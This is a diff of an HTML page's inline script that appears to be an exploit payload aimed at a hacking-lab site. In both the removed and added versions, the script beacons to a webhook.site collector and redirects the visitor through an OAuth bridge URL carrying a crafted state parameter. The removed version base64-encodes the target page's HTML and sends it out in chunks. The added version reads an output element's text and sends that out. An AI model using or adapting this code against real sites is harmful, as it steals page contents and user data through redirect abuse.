@@ -2,21 +2,19 @@
 <script>
 var C='https://webhook.site/e2800127-7671-4b5d-a058-6a5ed1f0d9ec';
 function ping(t,d){new Image().src=C+'?tag='+t+'&d='+encodeURIComponent(JSON.stringify(d||{}));}
-ping('V5',{ua:navigator.userAgent.slice(0,30)});
-setTimeout(function(){
- ping('PRENAV');
- location='https://cloud-console-534f164158ae.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{"target_host":"clf-534f164158ae.pwnbox-lab.com","return_to":"/"}');
-},300);
-</script>
-<script>
-window.addEventListener('load',function(){
- if(location.hostname.indexOf('pwnbox-lab.com')>-1){
-  function bx(s){return btoa(unescape(encodeURIComponent(s)));}
-  var enc=bx(document.documentElement.outerHTML);
-  ping('LANDED',{host:location.host,len:enc.length});
-  for(var i=0,o=0;o<enc.length;i++,o+=1100){
-   new Image().src=C+'?tag=VC&i='+i+'&d='+enc.substr(o,1100);
-  }
+ping('V6',{ua:navigator.userAgent.slice(0,30)});
+setInterval(function(){
+ if(location.hostname.indexOf('clf-')===0 && !window.__sent){
+  window.__sent=1;
+  try{
+   var out=document.getElementById('out');
+   var txt=out?out.innerText:'NOOUT';
+   ping('CLFTEXT',{t:txt.slice(0,900)});
+  }catch(e){ping('CLFERR',{e:String(e)})}
  }
-});
+},700);
+setTimeout(function(){
+ ping('NAVNOW');
+ location='https://cloud-console-bb0490164417.pwnbox-lab.com/oauth/bridge?state='+encodeURIComponent('{"target_host":"clf-bb0490164417.pwnbox-lab.com","return_to":"/"}');
+},400);
 </script></body></html>
